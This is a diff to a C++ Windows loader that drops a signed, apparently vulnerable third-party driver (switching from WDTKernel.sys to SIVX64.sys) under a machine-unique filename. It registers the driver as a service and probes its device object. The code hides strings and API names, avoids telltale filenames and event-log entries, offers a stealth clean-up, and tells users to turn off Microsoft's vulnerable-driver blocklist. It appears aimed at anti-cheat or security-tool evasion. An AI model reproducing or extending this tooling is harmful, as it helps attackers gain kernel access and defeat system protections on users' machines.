@@ -22,7 +22,7 @@
 // ── Per-machine hardware fingerprint ─────────────────────────────────────────
 // Mixes volume serial number + CPUID family/stepping into a stable DWORD.
 // Used to generate a machine-unique driver drop path that avoids a predictable
-// filename IOC like "WDTKernel.sys" while remaining stable across reboots.
+// filename IOC like "SIVX64.sys" while remaining stable across reboots.
 static DWORD GetHwKey() {
     DWORD serial = 0;
     using GVI_fn = BOOL(WINAPI*)(LPCSTR, LPSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPSTR, DWORD);
@@ -35,7 +35,8 @@ static DWORD GetHwKey() {
 
 // ── Driver drop path ──────────────────────────────────────────────────────────
 // Generates a machine-stable path like %SystemRoot%\System32\drivers\A3F19C2B.sys.
-// Copy WDTKernel.sys (Dell Watchdog Timer) to this path before launching.
+// Copy SIVX64.sys (SIV v5.85, Ray Hinchliffe, WHCP-signed) to this path before
+// launching.
 static const char* GetDriverPath() {
     static char s_path[MAX_PATH] = {};
     static bool s_ready = false;
@@ -95,7 +96,7 @@ static HANDLE TryOpenDevice(const char* path, DWORD access, DWORD* outErr) {
     return h;
 }
 
-// Case-B recovery: the DACL on \Device\__WDT__ may block GENERIC_READ|WRITE
+// Case-B recovery: the DACL on \Device\SIVDRIVER may block GENERIC_READ|WRITE
 // even from an admin process. Fall through several access modes and path
 // spellings until one opens, then close it — we only need to prove the
 // device is reachable. Returns the last err code on total failure.
@@ -106,13 +107,13 @@ static bool ProbeDeviceAllVariants(DWORD* outErr) {
     struct Attempt { const char* path; DWORD access; };
     // Ordered from strictest to loosest; first success wins.
     Attempt attempts[] = {
-        { skCrypt("\\\\.\\__WDT__"),          GENERIC_READ | GENERIC_WRITE },
-        { skCrypt("\\\\.\\__WDT__"),          GENERIC_READ                 },
-        { skCrypt("\\\\.\\__WDT__"),          SYNCHRONIZE                  },
-        { skCrypt("\\\\.\\__WDT__"),          0                            },
-        { skCrypt("\\\\.\\GLOBALROOT\\Device\\__WDT__"), GENERIC_READ | GENERIC_WRITE },
-        { skCrypt("\\\\.\\GLOBALROOT\\Device\\__WDT__"), 0                 },
-        { skCrypt("\\\\?\\__WDT__"),          GENERIC_READ | GENERIC_WRITE },
+        { skCrypt("\\\\.\\SIVDRIVER"),        GENERIC_READ | GENERIC_WRITE },
+        { skCrypt("\\\\.\\SIVDRIVER"),        GENERIC_READ                 },
+        { skCrypt("\\\\.\\SIVDRIVER"),        SYNCHRONIZE                  },
+        { skCrypt("\\\\.\\SIVDRIVER"),        0                            },
+        { skCrypt("\\\\.\\GLOBALROOT\\Device\\SIVDRIVER"), GENERIC_READ | GENERIC_WRITE },
+        { skCrypt("\\\\.\\GLOBALROOT\\Device\\SIVDRIVER"), 0               },
+        { skCrypt("\\\\?\\SIVDRIVER"),        GENERIC_READ | GENERIC_WRITE },
     };
     DWORD lastErr = 0;
     for (auto& a : attempts) {
@@ -278,52 +279,12 @@ static const char* SvcStateName(DWORD s) {
     }
 }
 
-// Write the config keys the WDTKernel driver reads at load time. Without
-// these under HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters,
-// the driver may refuse to create its device object.
-// Value names taken from the driver's own string table:
-//   Enabled           REG_DWORD  1
-//   Interval          REG_DWORD  60000
-//   Reboot            REG_DWORD  0    (no watchdog reboot)
-//   AutoRefreshCycle  REG_DWORD  30000
-//   MinInterval       REG_DWORD  1000
-//   SSID              REG_DWORD  0xFFFF (accept any / not hardware-locked)
-static void WriteDriverParameters(const char* svcName) {
-    using PFN_RegCreateKeyExA = LONG(WINAPI*)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
-    using PFN_RegSetValueExA  = LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
-    using PFN_RegCloseKey     = LONG(WINAPI*)(HKEY);
-    auto pRegCreateKeyExA = reinterpret_cast<PFN_RegCreateKeyExA>(
-        AntiDebug::ResolveExport(AntiDebug::Fnv1a("RegCreateKeyExA")));
-    auto pRegSetValueExA  = reinterpret_cast<PFN_RegSetValueExA>(
-        AntiDebug::ResolveExport(AntiDebug::Fnv1a("RegSetValueExA")));
-    auto pRegCloseKey     = reinterpret_cast<PFN_RegCloseKey>(
-        AntiDebug::ResolveExport(AntiDebug::Fnv1a("RegCloseKey")));
-    if (!pRegCreateKeyExA || !pRegSetValueExA || !pRegCloseKey) return;
-
-    char keyPath[256];
-    snprintf(keyPath, sizeof(keyPath),
-             "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", svcName);
-    HKEY hKey = nullptr;
-    LONG r = pRegCreateKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, nullptr,
-                              REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
-                              nullptr, &hKey, nullptr);
-    if (r != ERROR_SUCCESS || !hKey) return;
-
-    struct DwVal { const char* name; DWORD value; };
-    DwVal vals[] = {
-        { "Enabled",          1        },
-        { "Interval",         60000    },
-        { "Reboot",           0        },
-        { "AutoRefreshCycle", 30000    },
-        { "MinInterval",      1000     },
-        { "SSID",             0xFFFF   },
-    };
-    for (auto& v : vals) {
-        pRegSetValueExA(hKey, v.name, 0, REG_DWORD,
-                        reinterpret_cast<const BYTE*>(&v.value), sizeof(v.value));
-    }
-    pRegCloseKey(hKey);
-}
+// SIV's DriverEntry creates \Device\SIVDRIVER unconditionally — it does NOT
+// read Parameters subkey values (unlike WDTKernel, which reads Enabled/
+// Interval/Reboot/AutoRefreshCycle/MinInterval/SSID during DriverEntry and
+// aborts device creation if they're missing). No Parameters key writes are
+// needed here; the service registration under HKLM\SYSTEM\...\Services\<svc>
+// alone is sufficient to let SCM load and start the driver.
 
 // Fast sanity check: the file at drvPath must exist, start with MZ,
 // and be a plausible driver size. Catches a mis-copied file before
@@ -402,10 +363,8 @@ static bool StartDriver() {
         return false;
     }
 
-    // Populate the driver's Parameters subkey BEFORE the first StartService
-    // attempt. The WDT driver reads Enabled/Interval/Reboot/etc from here
-    // during DriverEntry; missing values can cause it to skip device creation.
-    WriteDriverParameters(svcName);
+    // (SIVX64.sys reads no Parameters values at DriverEntry — device
+    // creation is unconditional, so no pre-start registry population needed.)
 
     // Reuse existing service entry after reboot — avoids Event ID 7045 on every launch.
     SC_HANDLE hExist = pOpenServiceA(hSCM, svcName, SERVICE_ALL_ACCESS);
@@ -449,13 +408,13 @@ static bool StartDriver() {
 
     if (GetFileAttributesA(drvPath) == INVALID_FILE_ATTRIBUTES) {
         std::cout << "[!] Driver file not found at: " << drvPath << "\n";
-        std::cout << "    Copy WDTKernel.sys to that path and retry.\n";
+        std::cout << "    Copy SIVX64.sys to that path and retry.\n";
         pCloseServiceHandle(hSCM);
         return false;
     }
     if (!ValidateDriverFile(drvPath)) {
         std::cout << "[!] Driver file at " << drvPath << " is not a valid PE image.\n";
-        std::cout << "    Re-copy WDTKernel.sys to that path.\n";
+        std::cout << "    Re-copy SIVX64.sys to that path.\n";
         pCloseServiceHandle(hSCM);
         return false;
     }
@@ -484,7 +443,11 @@ static bool StartDriver() {
         if (*hint) std::cout << " — " << hint;
         std::cout << "\n";
         if (err == 577 || err == 1275) {
-            std::cout << "    Driver blocklist rejected WDTKernel. Options:\n"
+            std::cout << "    Driver blocklist rejected SIVX64. This is unexpected —\n"
+                         "    SIVX64.sys (WHCP-signed, SHA256 33903E8F...) is not on\n"
+                         "    Microsoft's HVCI vulnerable-driver list as of Win11 25H2.\n"
+                         "    Options:\n"
+                         "      - Verify the .sys file matches the expected SHA256\n"
                          "      - HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config"
                          " → VulnerableDriverBlocklistEnable = 0, reboot\n"
                          "      - Or use a Windows build/SKU without the blocklist\n";
@@ -539,7 +502,7 @@ static void StopDriver() {
     pCloseServiceHandle(hSCM);
     // Keep the driver file on disk between runs — the machine-stable filename
     // acts as a persistent one-shot cache. Deleting it forces the user to
-    // re-copy WDTKernel.sys before every launch. If you want strict clean-up
+    // re-copy SIVX64.sys before every launch. If you want strict clean-up
     // on exit for stealth, uncomment the DeleteFileA call below.
     // DeleteFileA(GetDriverPath());
 }
@@ -617,11 +580,12 @@ int main()
                 std::cout << "  \033[91m[!]\033[0m Recovery failed.  service=" << SvcStateName(st2)
                           << "  device err=" << e2 << "\n";
                 if (e2 == 2) {
-                    std::cout << "      → Driver loaded but never published \\Device\\__WDT__.\n"
-                                 "        Most likely this driver is a PnP function driver bound to specific\n"
-                                 "        hardware not present on this system, so its device-creation callback\n"
-                                 "        never fires. A different driver whose DriverEntry unconditionally\n"
-                                 "        creates a control device would be needed.\n";
+                    std::cout << "      → Driver loaded but never published \\Device\\SIVDRIVER.\n"
+                                 "        SIVX64.sys creates its device unconditionally in DriverEntry, so\n"
+                                 "        an err=2 here after a successful service start almost always means\n"
+                                 "        HVCI/CI silently blocked the load, an anti-cheat DSE hook stripped\n"
+                                 "        device creation, or the on-disk file's signature was altered.\n"
+                                 "        Re-verify SHA256 (33903E8F...) and check HVCI blocklist state.\n";
                 }
             }
         }
@@ -663,7 +627,7 @@ int main()
                 DWORD state = QueryServiceState(GetSvcName());
                 std::cout << "\n\n  \033[91m[!]\033[0m Driver did not load.\n";
                 std::cout << "      Service:        " << GetSvcName() << " (state=" << SvcStateName(state) << ")\n";
-                std::cout << "      Device probe:   \\\\.\\__WDT__  err=" << lastDrvErr;
+                std::cout << "      Device probe:   \\\\.\\SIVDRIVER  err=" << lastDrvErr;
                 switch (lastDrvErr) {
                     case 2:   std::cout << " (ERROR_FILE_NOT_FOUND — driver loaded but never published its device object;\n"
                                           "                            typically means it's PnP-oriented and needs matching hardware,\n"
